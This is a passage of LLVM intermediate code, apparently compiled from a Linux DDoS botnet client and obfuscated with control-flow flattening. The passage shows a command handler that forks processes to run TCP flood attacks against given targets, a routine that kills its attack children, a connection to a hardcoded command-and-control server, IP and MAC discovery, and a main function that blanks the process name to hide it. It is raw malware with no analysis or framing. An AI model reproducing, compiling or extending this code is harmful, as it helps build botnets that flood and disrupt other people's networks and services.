  %451 = call i32 @strcmp(i8* %450, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.483, i32 0, i32 0)) #10
  %452 = icmp ne i32 %451, 0
  %453 = select i1 %452, i32 -2062450885, i32 -1807175628
  store i32 %453, i32* %switchVar
  br label %loopEnd

; <label>:454:                                    ; preds = %loopEntry
  %455 = load i32, i32* %3, align 4
  %456 = icmp slt i32 %455, 6
  %457 = select i1 %456, i32 1559880169, i32 1580891028
  store i32 %457, i32* %switchVar
  br label %loopEnd

; <label>:458:                                    ; preds = %loopEntry
  %459 = load i8**, i8*** %4, align 8
  %460 = getelementptr inbounds i8*, i8** %459, i64 3
  %461 = load i8*, i8** %460, align 8
  %462 = call i32 @atoi(i8* %461) #10
  %463 = icmp eq i32 %462, -1
  %464 = select i1 %463, i32 1559880169, i32 -583699307
  store i32 %464, i32* %switchVar
  br label %loopEnd

; <label>:465:                                    ; preds = %loopEntry
  %466 = load i8**, i8*** %4, align 8
  %467 = getelementptr inbounds i8*, i8** %466, i64 2
  %468 = load i8*, i8** %467, align 8
  %469 = call i32 @atoi(i8* %468) #10
  %470 = icmp eq i32 %469, -1
  %471 = select i1 %470, i32 1559880169, i32 863137465
  store i32 %471, i32* %switchVar
  br label %loopEnd

; <label>:472:                                    ; preds = %loopEntry
  %473 = load i8**, i8*** %4, align 8
  %474 = getelementptr inbounds i8*, i8** %473, i64 4
  %475 = load i8*, i8** %474, align 8
  %476 = call i32 @atoi(i8* %475) #10
  %477 = icmp eq i32 %476, -1
  %478 = select i1 %477, i32 1559880169, i32 -1774887793
  store i32 %478, i32* %switchVar
  br label %loopEnd

; <label>:479:                                    ; preds = %loopEntry
  %480 = load i8**, i8*** %4, align 8
  %481 = getelementptr inbounds i8*, i8** %480, i64 4
  %482 = load i8*, i8** %481, align 8
  %483 = call i32 @atoi(i8* %482) #10
  %484 = icmp sgt i32 %483, 32
  %485 = select i1 %484, i32 1559880169, i32 -1859147317
  store i32 %485, i32* %switchVar
  br label %loopEnd

; <label>:486:                                    ; preds = %loopEntry
  %487 = load i32, i32* %3, align 4
  %488 = icmp sgt i32 %487, 6
  %489 = select i1 %488, i32 76845469, i32 830046976
  store i32 %489, i32* %switchVar
  br label %loopEnd

; <label>:490:                                    ; preds = %loopEntry
  %491 = load i8**, i8*** %4, align 8
  %492 = getelementptr inbounds i8*, i8** %491, i64 6
  %493 = load i8*, i8** %492, align 8
  %494 = call i32 @atoi(i8* %493) #10
  %495 = icmp slt i32 %494, 0
  %496 = select i1 %495, i32 1559880169, i32 830046976
  store i32 %496, i32* %switchVar
  br label %loopEnd

; <label>:497:                                    ; preds = %loopEntry
  %498 = load i32, i32* %3, align 4
  %499 = icmp eq i32 %498, 8
  %500 = select i1 %499, i32 713424143, i32 1436015630
  store i32 %500, i32* %switchVar
  br label %loopEnd

; <label>:501:                                    ; preds = %loopEntry
  %502 = load i8**, i8*** %4, align 8
  %503 = getelementptr inbounds i8*, i8** %502, i64 7
  %504 = load i8*, i8** %503, align 8
  %505 = call i32 @atoi(i8* %504) #10
  %506 = icmp slt i32 %505, 1
  %507 = select i1 %506, i32 1559880169, i32 1436015630
  store i32 %507, i32* %switchVar
  br label %loopEnd

; <label>:508:                                    ; preds = %loopEntry
  store i32 1468393278, i32* %switchVar
  br label %loopEnd

; <label>:509:                                    ; preds = %loopEntry
  %510 = load i8**, i8*** %4, align 8
  %511 = getelementptr inbounds i8*, i8** %510, i64 1
  %512 = load i8*, i8** %511, align 8
  store i8* %512, i8** %21, align 8
  %513 = load i8**, i8*** %4, align 8
  %514 = getelementptr inbounds i8*, i8** %513, i64 2
  %515 = load i8*, i8** %514, align 8
  %516 = call i32 @atoi(i8* %515) #10
  store i32 %516, i32* %22, align 4
  %517 = load i8**, i8*** %4, align 8
  %518 = getelementptr inbounds i8*, i8** %517, i64 3
  %519 = load i8*, i8** %518, align 8
  %520 = call i32 @atoi(i8* %519) #10
  store i32 %520, i32* %23, align 4
  %521 = load i8**, i8*** %4, align 8
  %522 = getelementptr inbounds i8*, i8** %521, i64 4
  %523 = load i8*, i8** %522, align 8
  %524 = call i32 @atoi(i8* %523) #10
  store i32 %524, i32* %24, align 4
  %525 = load i8**, i8*** %4, align 8
  %526 = getelementptr inbounds i8*, i8** %525, i64 5
  %527 = load i8*, i8** %526, align 8
  store i8* %527, i8** %25, align 8
  %528 = load i32, i32* %3, align 4
  %529 = icmp eq i32 %528, 8
  %530 = select i1 %529, i32 -937440219, i32 443565145
  store i32 %530, i32* %switchVar
  br label %loopEnd

; <label>:531:                                    ; preds = %loopEntry
  %532 = load i8**, i8*** %4, align 8
  %533 = getelementptr inbounds i8*, i8** %532, i64 7
  %534 = load i8*, i8** %533, align 8
  %535 = call i32 @atoi(i8* %534) #10
  store i32 -1364664995, i32* %switchVar
  store i32 %535, i32* %.reg2mem4
  br label %loopEnd

; <label>:536:                                    ; preds = %loopEntry
  store i32 -1364664995, i32* %switchVar
  store i32 10, i32* %.reg2mem4
  br label %loopEnd

; <label>:537:                                    ; preds = %loopEntry
  %.reload5 = load i32, i32* %.reg2mem4
  store i32 %.reload5, i32* %26, align 4
  %538 = load i32, i32* %3, align 4
  %539 = icmp sgt i32 %538, 6
  %540 = select i1 %539, i32 -1973242497, i32 -601656639
  store i32 %540, i32* %switchVar
  br label %loopEnd

; <label>:541:                                    ; preds = %loopEntry
  %542 = load i8**, i8*** %4, align 8
  %543 = getelementptr inbounds i8*, i8** %542, i64 6
  %544 = load i8*, i8** %543, align 8
  %545 = call i32 @atoi(i8* %544) #10
  store i32 -1669035323, i32* %switchVar
  store i32 %545, i32* %.reg2mem6
  br label %loopEnd

; <label>:546:                                    ; preds = %loopEntry
  store i32 -1669035323, i32* %switchVar
  store i32 0, i32* %.reg2mem6
  br label %loopEnd

; <label>:547:                                    ; preds = %loopEntry
  %.reload7 = load i32, i32* %.reg2mem6
  store i32 %.reload7, i32* %27, align 4
  %548 = load i8*, i8** %21, align 8
  %549 = call i8* @strstr(i8* %548, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i32 0, i32 0)) #10
  %550 = icmp ne i8* %549, null
  %551 = select i1 %550, i32 -1302304965, i32 1714573243
  store i32 %551, i32* %switchVar
  br label %loopEnd

; <label>:552:                                    ; preds = %loopEntry
  %553 = load i8*, i8** %21, align 8
  %554 = call i8* @strtok(i8* %553, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i32 0, i32 0)) #5
  store i8* %554, i8** %28, align 8
  store i32 1274251542, i32* %switchVar
  br label %loopEnd

; <label>:555:                                    ; preds = %loopEntry
  %556 = load i8*, i8** %28, align 8
  %557 = icmp ne i8* %556, null
  %558 = select i1 %557, i32 1907745865, i32 2007301107
  store i32 %558, i32* %switchVar
  br label %loopEnd

; <label>:559:                                    ; preds = %loopEntry
  %560 = call i32 @listFork()
  %561 = icmp ne i32 %560, 0
  %562 = select i1 %561, i32 -1512711481, i32 898650490
  store i32 %562, i32* %switchVar
  br label %loopEnd

; <label>:563:                                    ; preds = %loopEntry
  %564 = load i8*, i8** %28, align 8
  %565 = load i32, i32* %22, align 4
  %566 = load i32, i32* %23, align 4
  %567 = load i32, i32* %24, align 4
  %568 = load i8*, i8** %25, align 8
  %569 = load i32, i32* %27, align 4
  %570 = load i32, i32* %26, align 4
  call void @sendTCP(i8* %564, i32 %565, i32 %566, i32 %567, i8* %568, i32 %569, i32 %570)
  call void @_exit(i32 0) #12
  unreachable

; <label>:571:                                    ; preds = %loopEntry
  %572 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i32 0, i32 0)) #5
  store i8* %572, i8** %28, align 8
  store i32 1274251542, i32* %switchVar
  br label %loopEnd

; <label>:573:                                    ; preds = %loopEntry
  store i32 1860080907, i32* %switchVar
  br label %loopEnd

; <label>:574:                                    ; preds = %loopEntry
  %575 = call i32 @listFork()
  %576 = icmp ne i32 %575, 0
  %577 = select i1 %576, i32 -973852124, i32 -2078500243
  store i32 %577, i32* %switchVar
  br label %loopEnd

; <label>:578:                                    ; preds = %loopEntry
  store i32 1468393278, i32* %switchVar
  br label %loopEnd

; <label>:579:                                    ; preds = %loopEntry
  %580 = load i8*, i8** %21, align 8
  %581 = load i32, i32* %22, align 4
  %582 = load i32, i32* %23, align 4
  %583 = load i32, i32* %24, align 4
  %584 = load i8*, i8** %25, align 8
  %585 = load i32, i32* %27, align 4
  %586 = load i32, i32* %26, align 4
  call void @sendTCP(i8* %580, i32 %581, i32 %582, i32 %583, i8* %584, i32 %585, i32 %586)
  call void @_exit(i32 0) #12
  unreachable

; <label>:587:                                    ; preds = %loopEntry
  store i32 -2062450885, i32* %switchVar
  br label %loopEnd

; <label>:588:                                    ; preds = %loopEntry
  %589 = load i8**, i8*** %4, align 8
  %590 = getelementptr inbounds i8*, i8** %589, i64 0
  %591 = load i8*, i8** %590, align 8
  %592 = call i32 @strcmp(i8* %591, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.484, i32 0, i32 0)) #10
  %593 = icmp ne i32 %592, 0
  %594 = select i1 %593, i32 -2112594773, i32 1401694362
  store i32 %594, i32* %switchVar
  br label %loopEnd

; <label>:595:                                    ; preds = %loopEntry
  store i32 0, i32* %29, align 4
  store i64 0, i64* %30, align 8
  store i32 1554152383, i32* %switchVar
  br label %loopEnd

; <label>:596:                                    ; preds = %loopEntry
  %597 = load i64, i64* %30, align 8
  %598 = load i64, i64* @numpids, align 8
  %599 = icmp ult i64 %597, %598
  %600 = select i1 %599, i32 2050719697, i32 1261900687
  store i32 %600, i32* %switchVar
  br label %loopEnd

; <label>:601:                                    ; preds = %loopEntry
  %602 = load i32*, i32** @pids, align 8
  %603 = load i64, i64* %30, align 8
  %604 = getelementptr inbounds i32, i32* %602, i64 %603
  %605 = load i32, i32* %604, align 4
  %606 = icmp ne i32 %605, 0
  %607 = select i1 %606, i32 1117053877, i32 301035408
  store i32 %607, i32* %switchVar
  br label %loopEnd

; <label>:608:                                    ; preds = %loopEntry
  %609 = load i32*, i32** @pids, align 8
  %610 = load i64, i64* %30, align 8
  %611 = getelementptr inbounds i32, i32* %609, i64 %610
  %612 = load i32, i32* %611, align 4
  %613 = call i32 @getpid() #5
  %614 = icmp ne i32 %612, %613
  %615 = select i1 %614, i32 683344751, i32 301035408
  store i32 %615, i32* %switchVar
  br label %loopEnd

; <label>:616:                                    ; preds = %loopEntry
  %617 = load i32*, i32** @pids, align 8
  %618 = load i64, i64* %30, align 8
  %619 = getelementptr inbounds i32, i32* %617, i64 %618
  %620 = load i32, i32* %619, align 4
  %621 = call i32 @kill(i32 %620, i32 9) #5
  %622 = load i32, i32* %29, align 4
  %623 = add nsw i32 %622, 1
  store i32 %623, i32* %29, align 4
  store i32 301035408, i32* %switchVar
  br label %loopEnd

; <label>:624:                                    ; preds = %loopEntry
  store i32 328508029, i32* %switchVar
  br label %loopEnd

; <label>:625:                                    ; preds = %loopEntry
  %626 = load i64, i64* %30, align 8
  %627 = add i64 %626, 1
  store i64 %627, i64* %30, align 8
  store i32 1554152383, i32* %switchVar
  br label %loopEnd

; <label>:628:                                    ; preds = %loopEntry
  %629 = load i32, i32* %29, align 4
  %630 = icmp sgt i32 %629, 0
  %631 = select i1 %630, i32 -407656965, i32 1381904674
  store i32 %631, i32* %switchVar
  br label %loopEnd

; <label>:632:                                    ; preds = %loopEntry
  store i32 1054240138, i32* %switchVar
  br label %loopEnd

; <label>:633:                                    ; preds = %loopEntry
  store i32 1054240138, i32* %switchVar
  br label %loopEnd

; <label>:634:                                    ; preds = %loopEntry
  store i32 -2112594773, i32* %switchVar
  br label %loopEnd

; <label>:635:                                    ; preds = %loopEntry
  %636 = load i8**, i8*** %4, align 8
  %637 = getelementptr inbounds i8*, i8** %636, i64 0
  %638 = load i8*, i8** %637, align 8
  %639 = call i32 @strcmp(i8* %638, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.485, i32 0, i32 0)) #10
  %640 = icmp ne i32 %639, 0
  %641 = select i1 %640, i32 1468393278, i32 1564992931
  store i32 %641, i32* %switchVar
  br label %loopEnd

; <label>:642:                                    ; preds = %loopEntry
  call void @exit(i32 0) #14
  unreachable

; <label>:643:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %635, %634, %633, %632, %628, %625, %624, %616, %608, %601, %596, %595, %588, %587, %578, %574, %573, %571, %559, %555, %552, %547, %546, %541, %537, %536, %531, %509, %508, %501, %497, %490, %486, %479, %472, %465, %458, %454, %447, %446, %441, %437, %436, %434, %426, %422, %419, %403, %402, %395, %388, %384, %377, %376, %374, %373, %369, %367, %362, %361, %357, %350, %347, %346, %342, %335, %334, %330, %323, %283, %279, %278, %271, %264, %260, %253, %252, %244, %240, %239, %237, %226, %222, %219, %214, %213, %208, %185, %184, %177, %173, %166, %159, %152, %145, %138, %131, %127, %120, %119, %115, %114, %110, %108, %103, %102, %98, %91, %88, %87, %83, %76, %69, %68, %59, %52, %47, %40, %37, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #2

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: nounwind
declare i32 @getpid() #2

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 4096, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  store i32 %5, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -559006651, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -559006651, label %first
    i32 647987444, label %8
    i32 1591640439, label %11
    i32 -889737960, label %17
    i32 1228787583, label %18
    i32 2123523927, label %21
    i32 -1952274370, label %32
    i32 -1355707495, label %39
    i32 -2048273737, label %47
    i32 -258655108, label %48
    i32 -1043786799, label %49
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %6 = icmp ne i32 %.reload, 0
  %7 = select i1 %6, i32 647987444, i32 1591640439
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* @mainCommSock, align 4
  %10 = call i32 @close(i32 %9)
  store i32 0, i32* @mainCommSock, align 4
  store i32 1591640439, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* @currentServer, align 4
  %13 = add nsw i32 %12, 1
  %14 = sext i32 %13 to i64
  %15 = icmp eq i64 %14, 1
  %16 = select i1 %15, i32 -889737960, i32 1228787583
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 0, i32* @currentServer, align 4
  store i32 2123523927, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* @currentServer, align 4
  %20 = add nsw i32 %19, 1
  store i32 %20, i32* @currentServer, align 4
  store i32 2123523927, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %23 = load i32, i32* @currentServer, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %24
  %26 = load i8*, i8** %25, align 8
  %27 = call i8* @strcpy(i8* %22, i8* %26) #5
  store i32 23, i32* %3, align 4
  %28 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %29 = call i8* @strchr(i8* %28, i32 58) #10
  %30 = icmp ne i8* %29, null
  %31 = select i1 %30, i32 -1952274370, i32 -1355707495
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %34 = call i8* @strchr(i8* %33, i32 58) #10
  %35 = getelementptr inbounds i8, i8* %34, i64 1
  %36 = call i32 @atoi(i8* %35) #10
  store i32 %36, i32* %3, align 4
  %37 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %38 = call i8* @strchr(i8* %37, i32 58) #10
  store i8 0, i8* %38, align 1
  store i32 -1355707495, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = call i32 @socket(i32 2, i32 1, i32 0) #5
  store i32 %40, i32* @mainCommSock, align 4
  %41 = load i32, i32* @mainCommSock, align 4
  %42 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %43 = load i32, i32* %3, align 4
  %44 = call i32 @connectTimeout(i32 %41, i8* %42, i32 %43, i32 30)
  %45 = icmp ne i32 %44, 0
  %46 = select i1 %45, i32 -258655108, i32 -2048273737
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 1, i32* %1, align 4
  store i32 -1043786799, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 -1043786799, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %1, align 4
  ret i32 %50

loopEnd:                                          ; preds = %48, %47, %39, %32, %21, %18, %17, %11, %8, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #5
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 2036762109, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 2036762109, label %first
    i32 -1949869986, label %16
    i32 177559170, label %17
    i32 -1812067166, label %31
    i32 1730510387, label %32
    i32 1834783096, label %39
    i32 514922118, label %40
    i32 459351705, label %45
    i32 1745611521, label %51
    i32 1814515370, label %56
    i32 -765093032, label %58
    i32 -1310819285, label %64
    i32 386899861, label %67
    i32 2115494821, label %69
    i32 1247596946, label %71
    i32 -311814847, label %78
    i32 -483726274, label %86
    i32 1536782569, label %90
    i32 -370655745, label %102
    i32 1420028757, label %105
    i32 -145906653, label %106
    i32 59895572, label %109
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp eq i32 %.reload, -1
  %15 = select i1 %14, i32 -1949869986, i32 177559170
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 59895572, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 16, i32 4, i1 false)
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %19, align 4
  %20 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.486, i32 0, i32 0)) #5
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %22 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %21, i32 0, i32 0
  store i32 %20, i32* %22, align 4
  %23 = call zeroext i16 @htons(i16 zeroext 53) #13
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %23, i16* %24, align 2
  %25 = load i32, i32* %2, align 4
  %26 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %27 = call i32 @connect(i32 %25, %struct.sockaddr* %26, i32 16)
  store i32 %27, i32* %4, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp eq i32 %28, -1
  %30 = select i1 %29, i32 -1812067166, i32 1730510387
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 59895572, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 16, i32* %6, align 4
  %33 = load i32, i32* %2, align 4
  %34 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %35 = call i32 @getsockname(i32 %33, %struct.sockaddr* %34, i32* %6) #5
  store i32 %35, i32* %4, align 4
  %36 = load i32, i32* %4, align 4
  %37 = icmp eq i32 %36, -1
  %38 = select i1 %37, i32 1834783096, i32 514922118
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 59895572, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %42 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %41, i32 0, i32 0
  %43 = load i32, i32* %42, align 4
  store i32 %43, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %44 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.487, i32 0, i32 0), i32 0)
  store i32 %44, i32* %7, align 4
  store i32 459351705, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %47 = load i32, i32* %7, align 4
  %48 = call i8* @fdgets(i8* %46, i32 4096, i32 %47)
  %49 = icmp ne i8* %48, null
  %50 = select i1 %49, i32 1745611521, i32 1247596946
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %53 = call i8* @strstr(i8* %52, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.488, i32 0, i32 0)) #10
  %54 = icmp ne i8* %53, null
  %55 = select i1 %54, i32 1814515370, i32 2115494821
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %57, i8** %9, align 8
  store i32 -765093032, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i8*, i8** %9, align 8
  %60 = load i8, i8* %59, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp ne i32 %61, 9
  %63 = select i1 %62, i32 -1310819285, i32 386899861
  store i32 %63, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = load i8*, i8** %9, align 8
  %66 = getelementptr inbounds i8, i8* %65, i32 1
  store i8* %66, i8** %9, align 8
  store i32 -765093032, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i8*, i8** %9, align 8
  store i8 0, i8* %68, align 1
  store i32 1247596946, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %70, i8 0, i64 4096, i32 16, i1 false)
  store i32 459351705, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %7, align 4
  %73 = call i32 @close(i32 %72)
  %74 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %75 = load i8, i8* %74, align 16
  %76 = icmp ne i8 %75, 0
  %77 = select i1 %76, i32 -311814847, i32 -145906653
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %80 = bitcast %union.anon.5* %79 to [16 x i8]*
  %81 = getelementptr inbounds [16 x i8], [16 x i8]* %80, i32 0, i32 0
  %82 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %83 = call i8* @strcpy(i8* %81, i8* %82) #5
  %84 = load i32, i32* %2, align 4
  %85 = call i32 (i32, i64, ...) @ioctl(i32 %84, i64 35111, %struct.ifreq* %11) #5
  store i32 0, i32* %10, align 4
  store i32 -483726274, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i32, i32* %10, align 4
  %88 = icmp slt i32 %87, 6
  %89 = select i1 %88, i32 1536782569, i32 1420028757
  store i32 %89, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %92 = bitcast %union.anon.6* %91 to %struct.sockaddr*
  %93 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %92, i32 0, i32 1
  %94 = getelementptr inbounds [14 x i8], [14 x i8]* %93, i32 0, i32 0
  %95 = load i32, i32* %10, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds i8, i8* %94, i64 %96
  %98 = load i8, i8* %97, align 1
  %99 = load i32, i32* %10, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %100
  store i8 %98, i8* %101, align 1
  store i32 -370655745, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i32, i32* %10, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %10, align 4
  store i32 -483726274, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 -145906653, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %2, align 4
  %108 = call i32 @close(i32 %107)
  store i32 59895572, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  %110 = load i32, i32* %1, align 4
  ret i32 %110

loopEnd:                                          ; preds = %106, %105, %102, %90, %86, %78, %71, %69, %67, %64, %58, %56, %51, %45, %40, %39, %32, %31, %17, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #2

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #2

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.489, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [1024 x i8], align 16
  %20 = alloca i32, align 4
  %21 = alloca [10 x i8*], align 16
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.490, i32 0, i32 0), i8** %6, align 8
  %25 = call i8* @getBuild()
  %26 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %27 = call i8* @inet_ntoa(i32 %26) #5
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.491, i32 0, i32 0), i8* %25, i8* %27)
  %29 = load i8**, i8*** %5, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 0
  %31 = load i8*, i8** %30, align 8
  %32 = load i8**, i8*** %5, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 0
  %34 = load i8*, i8** %33, align 8
  %35 = call i64 @strlen(i8* %34) #10
  %36 = call i8* @strncpy(i8* %31, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.490, i32 0, i32 0), i64 %35) #5
  %37 = load i8**, i8*** %5, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.490, i32 0, i32 0), i8** %38, align 8
  %39 = load i8*, i8** %6, align 8
  %40 = ptrtoint i8* %39 to i64
